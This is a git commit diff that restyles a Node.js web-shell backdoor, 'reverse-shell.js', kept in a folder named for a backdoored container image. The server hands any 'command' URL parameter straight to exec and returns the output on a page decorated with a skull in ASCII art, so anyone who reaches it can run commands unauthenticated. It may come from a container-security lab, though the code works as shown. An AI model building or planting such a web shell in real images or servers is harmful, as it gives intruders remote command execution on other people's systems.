43bafa29724b30772a7069e9ebf5144763ab3d43
Corentin B <saluki@gmx.fr>
2019-02-17 22:12:33 +0100

    Writing simple backdoor image with shell

--- container-arp/backdoored-image/reverse-shell.js
+++ container-arp/backdoored-image/reverse-shell.js
@@ -6,17 +6,82 @@ const template = (stdout, stderr) => {
     <html>
         <head>
             <meta charset="utf-8">
-            <title>Backdoor</title>
+            <title>NodeJS Backdoor</title>
+            <style>
+                body { background: #000000; color: #20C20E; }
+                .container {
+                    display: flex;
+                    padding: 50px;
+                    height: 100%;
+                }
+                .left-pane {
+                    width: 300px;
+                }
+                .right-pane {
+                    flex-grow: 1;
+                }
+                h2 {
+                    font-family: monospace;
+                }
+                input[type="text"] {
+                    background: none;
+                    border: 1px solid #20C20E;
+                    padding: 5px;
+                    color: #20C20E;
+                    width: 300px;
+                }
+                input[type="submit"] {
+                    background: #20C20E;
+                    color: #000000;
+                    border: 0px;
+                    padding: 6px 12px;
+                    font-weight: bold;
+                }
+            </style>
         </head>
         <body>
-            <form method="GET">
-                <input type="text" name="command" placeholder="Command">
-                <input type="submit" value="Execute">
-            </form>
-            <br>
-            <pre>${stdout}</pre>
-            <hr>
-            <pre>${stderr}</pre>
+            <div class="container">
+                <div class="left-pane">
+                    <pre style="font-size: 0.8em;">
+                uuuuuuu                  
+            uu$$$$$$$$$$$uu             
+         uu$$$$$$$$$$$$$$$$$uu          
+        u$$$$$$$$$$$$$$$$$$$$$u         
+       u$$$$$$$$$$$$$$$$$$$$$$$u         
+      u$$$$$$$$$$$$$$$$$$$$$$$$$u
+      u$$$$$$$$$$$$$$$$$$$$$$$$$u
+      u$$$$$$"   "$$$"   "$$$$$$u     
+      "$$$$"      u$u       $$$$"     
+       $$$u       u$u       u$$$        
+       $$$u      u$$$u      u$$$        
+        "$$$$uu$$$   $$$uu$$$$"         
+         "$$$$$$$"   "$$$$$$$"
+           u$$$$$$$u$$$$$$$u            
+            u$"$"$"$"$"$"$u
+ uuu        $$u$ $ $ $ $u$$       uuu
+u$$$$        $$$$$u$u$u$$$       u$$$$
+ $$$$$uu      "$$$$$$$$$"     uu$$$$$$
+u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
+$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
+"""      ""$$$$$$$$$$$uu ""$"""
+          uuuu ""$$$$$$$$$$uuu
+ u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
+ $$$$$$$$$$""""           ""$$$$$$$$$$$"
+  "$$$$$"                      ""$$$$""
+    $$$"                         $$$$"
+
+                    </pre>
+                </div>
+                <div class="right-pane">
+                    <h2>NodeJS Backdoor</h2>
+                    <form method="GET">
+                        <input type="text" class="command-input" name="command" placeholder="Command">
+                        <input type="submit" value="EXECUTE IN CONTAINER">
+                    </form>
+                    <pre>${stdout}</pre>
+                    <pre>${stderr}</pre>
+                </div>
+            </div>
         </body>
     </html>
     `;
@@ -27,13 +92,13 @@ const server = require('http').createServer((request, response) => {
     const query = url.parse(request.url, true).query;
 
     if (!query || !query.command) {
-        response.end(template('', ''));
+        response.end(template('Provide a command', ''));
         return;
     }
 
     exec(query.command, (err, stdout, stderr) => {
         if (err) {
-            response.end(template('', ''));
+            response.end(template('[GOT AN ERROR]', err));
             return;
         }
         response.end(template(stdout, stderr));
